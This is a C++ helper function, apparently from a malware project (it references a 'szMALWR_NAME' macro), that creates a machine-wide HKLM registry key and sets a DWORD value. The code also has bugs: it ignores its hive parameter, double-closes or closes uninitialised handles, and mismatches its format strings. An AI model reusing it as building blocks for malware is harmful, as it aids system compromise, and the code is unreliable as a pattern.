#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

BOOL fnCreateRegistryKeyW(
	_In_ HKEY hKeyHK,
	_In_ LPCWSTR lpSubKey,
	_In_ BOOL wow32,
	_In_opt_ LPCWSTR lpValueName,
	_In_opt_ DWORD dwType,
	_In_opt_ DWORD dwValue
) {
	REGSAM _wow32;
	if (wow32) {
		_wow32 = KEY_WOW64_32KEY;
	} else {
		_wow32 = NULL;
	}

	HKEY hKey;
	if (!RegCreateKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | _wow32, NULL, &hKey, NULL)) {
		if (lpValueName) {
			if (!RegSetValueEx(hKey, lpValueName, 0, dwType, (PBYTE)&dwValue, sizeof(DWORD))) {
				RegCloseKey(hKey);
				return TRUE;
			} else {
#ifdef DEBUG_MSG
				fnErrorHandlerW(L"Couldn't set Registry Type/Value\nType: %d\nValue: %s 0x%X", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
					L"RegSetValueExW", MB_OK | MB_ICONWARNING, dwType, lpValueName, dwValue);
#endif // DEBUG_MSG
			}
		}
	} else {
#ifdef DEBUG_MSG
		fnErrorHandlerW(L"Couldn't create Registry Key\nKey: %s", NULL, L"RegCreateKeyExW", MB_OK | MB_ICONWARNING, lpSubKey);
#endif // DEBUG_MSG
	}

	RegCloseKey(hKey);
	return FALSE;
}